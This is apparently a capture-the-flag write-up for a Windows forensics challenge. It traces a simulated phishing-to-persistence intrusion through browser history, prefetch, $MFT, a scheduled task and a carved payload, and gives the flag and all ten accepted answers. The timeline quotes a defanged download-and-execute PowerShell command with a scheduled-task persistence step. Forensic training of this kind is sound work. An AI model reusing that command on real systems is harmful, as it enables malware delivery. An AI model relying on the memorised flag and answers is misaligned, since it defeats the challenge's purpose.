# TraceVX — WIN-TRACE-01 intrusion (17 Sep 2026, 14:32)

**Flag: `TVX{Ahmed@WIN-TRACE-01_TraceTelemetry-185.192.48.239_8MiB_411ff385}`**
(verified live twice against `nc 169.58.174.26 1337` — all 10 answers CONFIRMED)

## The image

`traceVX.zip` contains one file, `traceVX.ad1` — an FTK Imager logical image.
It was extracted with the open-source AD1-tools (`ad1info` / `ad1extract`,
built from `github.com/al3ks1s/AD1-tools`, libad1 without the FUSE file):

```
./ad1info    -i traceVX.ad1 -t        # 1,199 files
./ad1extract -i traceVX.ad1 -d files -m
```

Per `C:\ProgramData\TraceCache\README.txt`, the native artifacts are:
`disk.img` (raw, carvable), `SRUDB.sqlite`, `$MFT.bin` (UTF-16 paths),
`*.jsonl.gz` event logs, `*.pf` prefetch, and `url_reputation.bin` (XOR).
Everything else — 450 `cache_*.log` files, five users' worth of documents,
browser histories, PSReadLine histories, Shimcache/Amcache — is mostly
noise. The trick the prompt hints at is real: **every genuine artifact
lines up on 2026-09-17 in the 14:31–14:32 minute, under one account, with
non-`:00` seconds**, while decoys sit on round hours / other days.

## Timeline (all UTC, all Ahmed)

| Time | Source | Event |
|---|---|---|
| 14:31:12 | Edge History (Ahmed) | `https://cutt.ly/ms-portal-login` |
| 14:31:38 | Edge History | `https://t2m.io/r/8fJ2qA` (second shortener hop) |
| 14:31:51 | Edge History `.jsonl.gz` + Security 4624 | final landing `https://xn--login-microsoftnline-8sb.secure-verify.cc/auth/signin?src=mail`; logon by **Ahmed** |
| 14:32:18 | PowerShell 4104 + Prefetch `POWERSHELL.EXE-9A3B.pf` (SCCA, FirstRun 14:32:18, Runs=1, User=Ahmed) | `IWR hxxps://xn--login-microsoftnline-8sb.secure-verify.cc/a \| iex ; schtasks /create /tn TraceTelemetry` |
| 14:32:20 | USN journal CREATE | `C:\Users\Ahmed\AppData\Local\Temp\k29x8\stage.cmdline` |
| 14:32:27 | USN + $MFT DELETE | `stage.cmdline` wiped — 7 seconds after creation |
| 14:32:31 | $MFT CREATE | `C:\ProgramData\Microsoft\UpdateCache\UpdaterService.exe` (side file) |
| 14:32:36 | $MFT + USN CREATE | `C:\ProgramData\Microsoft\UpdateCache\Navigator.exe` — the dropped payload |
| 14:32:40 | `Tasks\TraceTelemetry.xml` Date | persistence task registered, Author Ahmed |

## The ten answers, in investigative order

1. **Patient-zero account — `Ahmed`.** Only Ahmed lines up across SRUDB,
   the 14:32 prefetch, the staged temp file (under his profile) and the
   persistence task. Other accounts (Administrator, ITAdmin, Sara, Guest)
   each own separate decoy chains: Guest/`helper.exe` beaconing to
   203.0.113.77:8080 on Sep 9, ITAdmin/`AuditRepair.exe` to
   198.51.100.44:53 on Sep 28 — both RFC 5737 TEST-NET addresses.

2. **Phishing host — `login-microsoftonline.secure-verify.cc`.** Not in
   cleartext: `ProgramData\Microsoft\Windows\Defender\Support\url_reputation.bin`
   starts `TVXURLv1\0` followed by XOR-encoded bytes. The C2 is
   185.192.48.239, and (185+192+48+239) & 0xFF = 664 & 0xFF = **152 = 0x98**.
   XOR-ing with 0x98 gives
   `https://login-microsoftonline.secure-verify.cc/auth/signin` — the
   decoded form of the punycode (`xn--…`) homoglyph in the browser history.
   Note the spelling trap: the punycode label reads `microsoftnline`
   (no “o”), the XOR file has the full `microsoftonline`.

3. **Landing-page timestamp — `2026-09-17T14:31:51Z`.** In Ahmed's Edge
   `History.jsonl.gz`, the load immediately before the 14:32:18 PowerShell
   run is the final punycode sign-in URL at 14:31:51 (the 14:31:12 cutt.ly
   and 14:31:38 t2m.io loads are the redirect hops into it).

4. **Executing process — `powershell.exe`.** Two prefetch files exist for
   PowerShell; only `POWERSHELL.EXE-9A3B.pf` is a real binary SCCA prefetch
   (the other, `-7446.pf`, is a text simulator stub, as are all the other
   `.pf` files). It records FirstRun `2026-09-17 14:32:18`, Runs=1,
   User=Ahmed — matching the single non-round PowerShell-Operational
   4104 event at 14:32:18Z.

5. **Staging file — `stage.cmdline`.** `$MFT.bin` stores paths in UTF-16,
   so a plain ASCII grep misses it; `strings -el $MFT.bin` (or the USN
   journal) shows `…\Temp\k29x8\stage.cmdline`, CREATE 14:32:20 /
   DELETE 14:32:27.

6. **Dropped binary — `Navigator.exe`.** Created 14:32:36 in
   `C:\ProgramData\Microsoft\UpdateCache\`, and it is what the persistence
   task launches. Carving proves which file it is: `disk.img` contains
   exactly two proper gzip streams (`1f 8b 08`) — at **0x4D000** and
   0x120000. Gunzipping 0x4D000 gives a PE whose metadata reads
   `OriginalFilename=NavigatorCore.dll`, `CompanyName=Acme Telemetry`,
   `C2=185.192.48.239:443`, `Account=Ahmed`. The 0x120000 stream is the
   benign decoy (“MZ benign updater stub … harmless”). Caution from the
   live run: `NavigatorCore.dll` is the carved file's *internal* name and
   is **not** the accepted answer — the dropped filename is `Navigator.exe`.

7. **SHA-256 of the carved, decompressed PE —
   `411ff3850c2ed96028e4f39184fed07c3fdacf56936e03581ce479c6ed7ab8cd`**
   (4,346 bytes). Not any hash printed as text in the image — the two PE
   stubs in `AcmeUpdate\cache` carry plausible-looking SHA256 strings
   (one even ends `…12345`); both are decoys, as are their files' real hashes.

8. **Persistence task — `TraceTelemetry`.** `Windows\System32\Tasks\TraceTelemetry.xml`:
   Date 2026-09-17T14:32:40Z, Author Ahmed, a **LogonTrigger** for
   `WIN-TRACE-01\Ahmed`, action
   `C:\ProgramData\Microsoft\UpdateCache\Navigator.exe`. Decoys:
   `Guest_MediaSync` (Guest, helper.exe) and `ITAdmin_Audit`.

9. **C2 endpoint — `185.192.48.239:443`.** Stated inside the carved PE
   (`C2=185.192.48.239:443`) and corroborated by SRUDB: `Navigator.exe`
   is the dropped binary that talks to it. Guest/ITAdmin beacons use
   RFC 5737 decoy IPs, and ordinary apps talk to ordinary Microsoft/Google IPs.

10. **Total exfiltrated (outbound) — `8388608` bytes (8 MiB).** From
    `SRUDB.sqlite` (`network_usage`):
    `SUM(bytes) WHERE remote_ip='185.192.48.239' AND direction='outbound'
    AND app IN ('Navigator.exe','AdaptConductor.exe')`
    = Navigator.exe 5,242,880 (14:31:51Z) + AdaptConductor.exe 3,145,728
    (15:48:02Z) = **8,388,608**. The Navigator.exe *inbound* 1,432,290-byte
    row (16:10:11Z) is a task result/download and is excluded. The flag
    itself encodes this check: `…_8MiB_411ff385`.

## Solver

`solvers/solve_01_tracevx.py` opens the analyst service, asks `hint` at
each question (hints do not consume an attempt), submits the ten answers
above in order, and prints the flag. `solvers/solve_all.py` runs it and
reports `1/1`.

```
unzip tracevx_writeup.zip && cd tracevx_writeup
python3 solvers/solve_all.py
# TVX{Ahmed@WIN-TRACE-01_TraceTelemetry-185.192.48.239_8MiB_411ff385}
# 1/1 challenges solved
```

Fresh-unzip test: 1/1 (flag captured live on a clean session, no wasted
attempts — Q6 is answered `Navigator.exe`, not the internal DLL name).

## Lesson

One minute, one account, one chain. In a sea of generated noise the real
intrusion was the only set of records that agreed with each other across
independent artifacts — browser, Security log, PowerShell, prefetch, USN,
$MFT, scheduled task, SRUM and a carved payload — and the decoys betrayed
themselves by round-hour timestamps, TEST-NET IPs, text-stub hashes, and
internal-vs-on-disk name mismatches.
